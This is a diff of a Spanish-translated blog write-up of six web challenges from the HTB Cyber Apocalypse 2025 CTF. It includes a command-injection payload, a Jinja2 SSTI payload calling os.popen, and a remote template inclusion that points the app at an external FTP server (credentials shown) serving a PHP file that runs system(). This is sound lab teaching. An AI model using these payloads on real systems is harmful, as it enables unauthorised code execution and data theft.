@@ -2,7 +2,7 @@
 title: Cyber Apocalypse 2025 - 6x Web Challenges Writeup
 date: 2025-03-25 08:00:00 -0500
 image: 
- path: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image.png
+ path: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/ca2025.jpg
  height: 1400
  width: 700
 categories: [HTB Writeups, Cyber Apocalypse CTF]
@@ -11,33 +11,31 @@ tags: [Writeup, CTF, Web]
 
 I participated as a member of team **CibersecUNI**. This time i managed to solve all 6/6 challenges in the web category.
 
-
 # Whispers of the Moonbeam
 
-- 🐳 _Instancer_ 1 IP (web ui)
-
-ovserving the functions, at the bottom it indicates use ; to `inject commands`.
+Observando las funciones, nos dan una pista que se puede inyectar comandos con ;.
 
 ![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-1.png)
 
-Using the command gossip, I can list the files, and with a simple ; I can read the flag
+Usando el comando gossip, puedo listar los archivos, se visualiza el archivo flag.txt, y con un simple ; puedo concatenar el comando cat para leer la flag.
 
 ```bash
 gossip; cat flag.txt
 ```
-Get the flag. 🎉
+Obtenemos la flag. 🎉
 HTB{Sh4d0w_3x3cut10n_1n_Th3_M00nb34m_T4v3rn_78cb9b70be3bf077e608865b967b5ab1}
 
-this was very straightforward challenge.
+Este fue un challenge muy directo de inyeccion de comandos.
 
 # Trial by Fire
 
-- 🐳 _Instancer_ 1 IP (web ui)
 - 📦 [web_trial_by_fire.zip](https://github.com/s4yhii/s4yhii.github.io/raw/master/assets/zip/web_trial_by_fire.zip)
 
-Looking at the ui, this might be exploitable to ssti
+Observando la UI, nos da una pista sobre SSTI.
 
 ![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-2.png)
+
+El reto nos muestra un campo en el cual podemos ingresar un nombre de usuario, el código de las rutas es:
 
 ```python
 @web.route('/begin', methods=['POST'])
@@ -69,9 +67,14 @@ def battle_report():
         'outcome': request.form.get('outcome', 'defeat')
     }
 ```
+Se ingresa el payload 7*7 para validar si en alguna ruta ese valor se renderiza al usar una plantilla y nos muestra el valor de 49.
+
+En la ruta /flamedrake se observa que no se renderiza el payload ingresado, esto debido a que se toma el valor como string.
+
 ![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-9.png)
 
-The template is the following, so we should hit the endpoint /battle-report in order to get our ssti payload work.
+Buscando otras rutas donde se renderiza el payload, se encuentra que en la ruta /battle-reports, nuestro payload se envía como parámetro y se renderiza el valor en la plantilla, lo cual hace que se visualize 49 en la respuesta.
+
 ![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-10.png)
 
 ```html
@@ -80,14 +83,14 @@ The template is the following, so we should hit the endpoint /battle-report in o
     <p class="nes-text is-primary warrior-name">{warrior_name}</p>
 </div>
 ```
-![a](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-3.png)
 
 ![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-11.png)
 
-After verifying that our string payload 7*7 is renderized as 49 in the response, we should inject our final payload to read the flag.
+Luego de verificar que efectivamente nuestro payload se renderiza como 49 en la respuesta, elaboramos nuestro payload para leer la flag.
 
-![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-5.png)
 ![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-12.png)
+
+Usaremos el siguiente payload, extraido de [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---basic-injection), pero con las modificaciones necesarios para leer la flag.
 
 {% raw %}
 ```liquid
@@ -95,12 +98,16 @@ warrior_name={{self._TemplateReference__context.cycler.__init__.__globals__.os.p
 ```
 {% endraw %}
 
+Luego de inyectar nuestro payload para leer la flag, se puedo visualizar en la UI de la ruta /battle-reports nuestra flag.
+
 ![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-6.png)
 
-![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-13.png)
-Get the flag. 🎉
-HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_9c285b69f155f1d253dfefe5fe30667d}
+O desde Caido usando la funcion de replay.
 
+![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-13.png)
+
+Se obtiene la flag. 🎉
+HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_9c285b69f155f1d253dfefe5fe30667d}
 
 # Cyber Attack
 
@@ -238,17 +245,59 @@ HTB{h4ndl1n6_m4l4k4r5_f0rc35}
 
 # Eldoria Panel
 
+Es una web que muestra misiones que pueden ser asignadas con la funcion "claim quest".
+
 ![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-20.png)
 
-Nos encontramos con este panel, existe una funcionalidad de "claim guest"
+Code Review:
 
-https://sftpcloud.io/tools/free-ftp-server
+La flag se encuentra en el directorio raiz con un nombre random gracias a esta linea en el entry.sh.
 
-FTP upload
+```bash
+mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt -> RCE
+```
+
+Toda página es retornada usando `render`.
+
+```php
+$app->get('/dashboard', function (Request $request, Response $response, $args) {
+    $html = render($GLOBALS['settings']['templatesPath'] . '/dashboard.php');
+    $response->getBody()->write($html);
+    return $response;
+})->add($authMiddleware);
+```
+La funcion render es vulnerable a RCE por el uso de la funcion eval, pero está usando file_exists antes de llamar a file_get_contents.
+Es posible setear la ruta de los templates llamanda a /api/admin/appSettings
+```php
+$app->post('/api/admin/appSettings', function (Request $request, Response $response, $args) {
+	$data = json_decode($request->getBody()->getContents(), true);
+	if (empty($data) || !is_array($data)) {
+		$result = ['status' => 'error', 'message' => 'No settings provided'];
+	} else {
+		$pdo = $this->get('db');
+		$stmt = $pdo->prepare("INSERT INTO app_settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value");
+		foreach ($data as $key => $value) {
+			$stmt->execute([$key, $value]);
+		}
+		if (isset($data['template_path'])) {
+			$GLOBALS['settings']['templatesPath'] = $data['template_path'];
+		}
+		$result = ['status' => 'success', 'message' => 'Settings updated'];
+	}
+	$response->getBody()->write(json_encode($result));
+	return $response->withHeader('Content-Type', 'application/json');
+})->add($adminApiKeyMiddleware);
+```
+
+El middleware es inútil porque llama a $handler->handle($request); independientemente -> cada usuario puede llamar a rutas própias de admin.
+
+Como no podemos escribir archivos en el servidor, usaremos el servicio ftp, ya que sirve con file_exsists y file_get_contents.
+
+Levantaremos un servidor ftp donde hostearemos nuestro archivo template llamado dashboard.php, usaré este servicio gratuito online para levantar mi servidor ftp: [Free FTP Server](https://sftpcloud.io/tools/free-ftp-server)
+
 ![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-21.png)
 
-
-![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-17.png)
+Creamos nuestro archivo template malicioso llamado dashboard.php, este contiene dos comandos para listar archivos y otro para leer la flag.
 
 ```php
 <?php
@@ -257,15 +306,25 @@ system("cat /flag*");
 ?>
 ```
 
+Se sube el archivo usando put dashboard.php
+
+![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-17.png)
+
+Seteamos la ruta de los templates haciendo un POST request a /api/admin/appSettings con el siguiente body:
+
 ```json
 {
   "template_path": "ftp://da192e7de042469196ddc45e20c9eb88:i2rMACU1fteQbrIEqh3zAqdNezrtTpKH@eu-central-1.sftpcloud.io"
 }
 ```
+
 ![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-18.png)
 
+Hacemos una solicitud a dashboard.php para que cargue nuestro archivo malicioso y se ejecuten los comandos.
+
 ![alt text](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2025/image-19.png)
-Get the flag. 🎉
+
+Se obtiene la flag. 🎉
 
 HTB{p41n_c4us3d_by_th3_usu4l_5u5p3ct_5f8e78373f521bac3069c1e39d487581}
 
